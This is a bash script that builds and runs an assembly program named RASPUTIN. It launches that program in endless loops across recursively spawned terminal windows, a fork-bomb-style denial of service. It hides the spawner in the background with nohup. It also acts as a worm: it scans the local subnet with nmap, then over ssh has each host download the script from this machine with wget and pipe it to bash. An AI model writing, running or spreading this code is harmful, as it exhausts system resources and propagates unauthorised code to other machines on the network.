#!/bin/bash

ASM_SOURCE="RASPUTIN.ASM"
OUTPUT_EXECUTABLE="RASPUTIN"

echo "Assembling $ASM_SOURCE..."
nasm -f elf32 "$ASM_SOURCE" -o "${ASM_SOURCE%.ASM}.o"
if [ $? -ne 0 ]; then
    echo "Assembly failed. Please check code."
    exit 1
fi

echo "Linking ${ASM_SOURCE%.ASM}.o..."
ld -m elf_i386 "${ASM_SOURCE%.ASM}.o" -o "$OUTPUT_EXECUTABLE"
if [ $? -ne 0 ]; then
    echo "Linking failed. Please check your object file."
    exit 1
fi

run_in_loop() {
    while true; do
        ./"$OUTPUT_EXECUTABLE"
    done
}

# Detect all available terminals
detect_terminals() {
    local terminals=()
    [[ -n "$TERMINAL" ]] && terminals+=("$TERMINAL -e")
    command -v gnome-terminal &>/dev/null && terminals+=("gnome-terminal -- bash -c")
    command -v xfce4-terminal &>/dev/null && terminals+=("xfce4-terminal --hold -e")
    command -v konsole &>/dev/null && terminals+=("konsole -e")
    command -v xterm &>/dev/null && terminals+=("xterm -e")
    command -v alacritty &>/dev/null && terminals+=("alacritty -e")
    command -v urxvt &>/dev/null && terminals+=("urxvt -e")
    command -v kitty &>/dev/null && terminals+=("kitty -e")
    command -v tilix &>/dev/null && terminals+=("tilix -e")
    command -v terminator &>/dev/null && terminals+=("terminator -x")
    
    if [ ${#terminals[@]} -eq 0 ]; then
        echo "No suitable terminal emulators found!"
        exit 1
    fi
    
    echo "${terminals[@]}"
}

TERMINALS=($(detect_terminals))

echo "Detected terminals: ${TERMINALS[*]}"

spawn_chaos() {
    while true; do
        local term="${TERMINALS[$RANDOM % ${#TERMINALS[@]}]}"
        echo "Spawning: $term"

        # Run the program inside a new terminal
        eval "$term \"$(declare -f run_in_loop); run_in_loop\"" &

        # Random delay before spawning another instance
        sleep 0.$((RANDOM % 2))

        # Random chance to recursively spawn another chaos function
        if (( RANDOM % 3 == 0 )); then
            eval "$term \"$(declare -f spawn_chaos); spawn_chaos\"" &
        fi
    done
}

hide_in_background() {
    nohup bash -c "$(declare -f spawn_chaos); spawn_chaos" >/dev/null 2>&1 &
}

spread_over_network() {
    local network_range=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -n 1)
    if [[ -z "$network_range" ]]; then
        echo "No network found. Skipping spread."
        return
    fi

    echo "Spreading to network range: $network_range"
    for ip in $(nmap -sn "$network_range" | awk '/Nmap scan report/{print $5}'); do
        if [[ "$ip" != "$(hostname -I | awk '{print $1}')" ]]; then
            echo "Attempting to spread to $ip..."
            ssh "$ip" "wget -qO- 'http://$(hostname -I | awk '{print $1}')/RASPUTIN.sh' | bash &" &
        fi
    done
}

hide_in_background
spread_over_network
spawn_chaos
